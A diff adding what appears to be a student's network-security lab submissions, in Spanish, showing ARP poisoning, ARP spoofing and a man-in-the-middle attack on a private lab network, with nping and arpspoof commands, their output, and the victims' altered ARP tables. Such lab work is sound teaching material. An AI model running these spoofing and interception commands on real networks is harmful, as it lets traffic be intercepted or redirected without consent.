@@ -1,0 +1,91 @@
+# Entrega 1 - ARP POISONING
+
+usuario@debian:~$ sudo ip neig show
+192.168.1.12 dev eth1 lladdr 00:01:02:03:04:05 PERMANENT
+
+# Entrega 2 - ARP POISONING REMOTO
+
+# Atacante:
+
+usuario@debian:~$ sudo nping --arp-type arp-reply --source-mac 00:01:02:03:04:05 --source-ip 192.168.1.12 -c 999 192.168.1.11
+
+Starting Nping 0.6.00 ( http://nmap.org/nping ) at 2020-03-03 11:17 CET
+SENT (0.0065s) ARP reply 192.168.1.12 is at 00:01:02:03:04:05
+SENT (1.0075s) ARP reply 192.168.1.12 is at 00:01:02:03:04:05
+SENT (2.0093s) ARP reply 192.168.1.12 is at 00:01:02:03:04:05
+SENT (3.0117s) ARP reply 192.168.1.12 is at 00:01:02:03:04:05
+SENT (4.0130s) ARP reply 192.168.1.12 is at 00:01:02:03:04:05
+SENT (5.0152s) ARP reply 192.168.1.12 is at 00:01:02:03:04:05
+^C 
+Max rtt: N/A | Min rtt: N/A | Avg rtt: N/A
+Raw packets sent: 6 (252B) | Rcvd: 0 (0B) | Lost: 6 (100.00%)
+Tx time: 5.78640s | Tx bytes/s: 43.55 | Tx pkts/s: 1.04
+Rx time: 5.78640s | Rx bytes/s: 0.00 | Rx pkts/s: 0.00
+Nping done: 1 IP address pinged in 5.79 seconds
+usuario@debian:~$ 
+
+# Victima 1:
+
+usuario@debian:~$ sudo ip neig show
+192.168.1.12 dev eth1 lladdr 00:01:02:03:04:05 STALE
+
+
+# Entrega 3 - ARP SPOOFING
+
+#Atacante
+
+usuario@debian:~$ sudo arpspoof -i eth1 -t 192.168.1.11 192.168.1.12
+8:0:27:a0:bf:81 8:0:27:ae:b5:7e 0806 42: arp reply 192.168.1.12 is-at 8:0:27:a0:bf:81
+8:0:27:a0:bf:81 8:0:27:ae:b5:7e 0806 42: arp reply 192.168.1.12 is-at 8:0:27:a0:bf:81
+8:0:27:a0:bf:81 8:0:27:ae:b5:7e 0806 42: arp reply 192.168.1.12 is-at 8:0:27:a0:bf:81
+8:0:27:a0:bf:81 8:0:27:ae:b5:7e 0806 42: arp reply 192.168.1.12 is-at 8:0:27:a0:bf:81
+^CCleaning up and re-arping targets...
+8:0:27:a0:bf:81 8:0:27:ae:b5:7e 0806 42: arp reply 192.168.1.12 is-at 8:0:27:25:26:2f
+8:0:27:a0:bf:81 8:0:27:ae:b5:7e 0806 42: arp reply 192.168.1.12 is-at 8:0:27:25:26:2f
+8:0:27:a0:bf:81 8:0:27:ae:b5:7e 0806 42: arp reply 192.168.1.12 is-at 8:0:27:25:26:2f
+8:0:27:a0:bf:81 8:0:27:ae:b5:7e 0806 42: arp reply 192.168.1.12 is-at 8:0:27:25:26:2f
+8:0:27:a0:bf:81 8:0:27:ae:b5:7e 0806 42: arp reply 192.168.1.12 is-at 8:0:27:25:26:2f
+
+# Victima 1
+
+usuario@debian:~$ sudo ip neig show
+[sudo] password for usuario: 
+192.168.1.12 dev eth1 lladdr 08:00:27:a0:bf:81 REACHABLE
+192.168.1.10 dev eth1 lladdr 08:00:27:a0:bf:81 STALE
+
+
+# Entrega 4 - MAN IN THE MIDDLE
+
+# Atacante
+
+usuario@debian:~$ sudo arpspoof -i eth1 -t 192.168.1.12 -r 192.168.1.11
+8:0:27:a0:bf:81 8:0:27:25:26:2f 0806 42: arp reply 192.168.1.11 is-at 8:0:27:a0:bf:81
+8:0:27:a0:bf:81 8:0:27:ae:b5:7e 0806 42: arp reply 192.168.1.12 is-at 8:0:27:a0:bf:81
+8:0:27:a0:bf:81 8:0:27:25:26:2f 0806 42: arp reply 192.168.1.11 is-at 8:0:27:a0:bf:81
+8:0:27:a0:bf:81 8:0:27:ae:b5:7e 0806 42: arp reply 192.168.1.12 is-at 8:0:27:a0:bf:81
+8:0:27:a0:bf:81 8:0:27:25:26:2f 0806 42: arp reply 192.168.1.11 is-at 8:0:27:a0:bf:81
+8:0:27:a0:bf:81 8:0:27:ae:b5:7e 0806 42: arp reply 192.168.1.12 is-at 8:0:27:a0:bf:81
+8:0:27:a0:bf:81 8:0:27:25:26:2f 0806 42: arp reply 192.168.1.11 is-at 8:0:27:a0:bf:81
+8:0:27:a0:bf:81 8:0:27:ae:b5:7e 0806 42: arp reply 192.168.1.12 is-at 8:0:27:a0:bf:81
+^CCleaning up and re-arping targets...
+8:0:27:a0:bf:81 8:0:27:25:26:2f 0806 42: arp reply 192.168.1.11 is-at 8:0:27:ae:b5:7e
+8:0:27:a0:bf:81 8:0:27:ae:b5:7e 0806 42: arp reply 192.168.1.12 is-at 8:0:27:25:26:2f
+8:0:27:a0:bf:81 8:0:27:25:26:2f 0806 42: arp reply 192.168.1.11 is-at 8:0:27:ae:b5:7e
+8:0:27:a0:bf:81 8:0:27:ae:b5:7e 0806 42: arp reply 192.168.1.12 is-at 8:0:27:25:26:2f
+8:0:27:a0:bf:81 8:0:27:25:26:2f 0806 42: arp reply 192.168.1.11 is-at 8:0:27:ae:b5:7e
+8:0:27:a0:bf:81 8:0:27:ae:b5:7e 0806 42: arp reply 192.168.1.12 is-at 8:0:27:25:26:2f
+8:0:27:a0:bf:81 8:0:27:25:26:2f 0806 42: arp reply 192.168.1.11 is-at 8:0:27:ae:b5:7e
+8:0:27:a0:bf:81 8:0:27:ae:b5:7e 0806 42: arp reply 192.168.1.12 is-at 8:0:27:25:26:2f
+8:0:27:a0:bf:81 8:0:27:25:26:2f 0806 42: arp reply 192.168.1.11 is-at 8:0:27:ae:b5:7e
+8:0:27:a0:bf:81 8:0:27:ae:b5:7e 0806 42: arp reply 192.168.1.12 is-at 8:0:27:25:26:2f
+
+# Victima 1
+
+usuario@debian:~$ sudo ip neig show
+192.168.1.12 dev eth1 lladdr 08:00:27:a0:bf:81 REACHABLE
+
+# Victima 2
+
+usuario@debian:~$ sudo ip neig show
+192.168.1.11 dev eth1 lladdr 08:00:27:a0:bf:81 REACHABLE
+
